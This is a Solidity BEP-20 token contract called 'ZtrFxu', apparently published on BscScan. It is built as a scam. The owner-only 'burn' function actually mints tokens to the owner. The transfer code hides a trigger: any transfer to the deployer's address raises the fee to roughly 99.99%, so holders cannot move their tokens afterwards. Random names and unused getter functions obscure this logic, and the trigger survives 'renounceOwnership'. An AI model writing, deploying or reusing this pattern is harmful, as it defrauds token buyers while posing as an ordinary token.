/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.2;
contract ZtrFxu {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  RHqBVF = address(0);
address private  JVEAUf = address(0);
address public owner;
uint256 private  CnNXBB = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  KycIjf = address(0);
uint256 private  kgzTVb = 1000000000000000000000;
uint256 private  VRLtEi = 1000000000000000;
address private  HYdiIo = address(0);
address private  ORssOB = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address private  DDyCqZ = address(0);
string public  symbol = "ZtrFxu";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  fYUOEP = address(0);
uint256 private  uwEdpX = 10000000000;
uint256 private  ZQSghW = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint8 public constant decimals = 18;
uint256 public constant SlMPbh = 99999;
string public  name = "ZtrFxu";
uint256 private  LEwKyi = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  qCpLob = 100000000;
address private  jkvsih = address(0);
address private  cyNvZc = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);


function _getLEwKyi() private returns (uint256) {
return LEwKyi;
}



constructor ()  public {
JVEAUf = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tzUPoxP 0");
require(spender != address(0), "fzUPoxP 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function _getHYdiIo() private returns (address) {
return HYdiIo;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getfYUOEP() private returns (address) {
return fYUOEP;
}

function _getjkvsih() private returns (address) {
return jkvsih;
}

function _getcyNvZc() private returns (address) {
return cyNvZc;
}

function _getVRLtEi() private returns (uint256) {
return VRLtEi;
}

function _getkgzTVb() private returns (uint256) {
return kgzTVb;
}

function _getDDyCqZ() private returns (address) {
return DDyCqZ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}




function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getKycIjf() private returns (address) {
return KycIjf;
}



function _getuwEdpX() private returns (uint256) {
return uwEdpX;
}

function _getRHqBVF() private returns (address) {
return RHqBVF;
}

function _getCnNXBB() private returns (uint256) {
return CnNXBB;
}





function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "zUPoxP");
require(to != address(0), "zUPoxP");
require(amount <= balanceOf[from], "zUPoxP");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SlMPbh/ZQSghW ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JVEAUf){
ZQSghW = SlMPbh+2;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}




function _getqCpLob() private returns (uint256) {
return qCpLob;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _getORssOB() private returns (address) {
return ORssOB;
}




}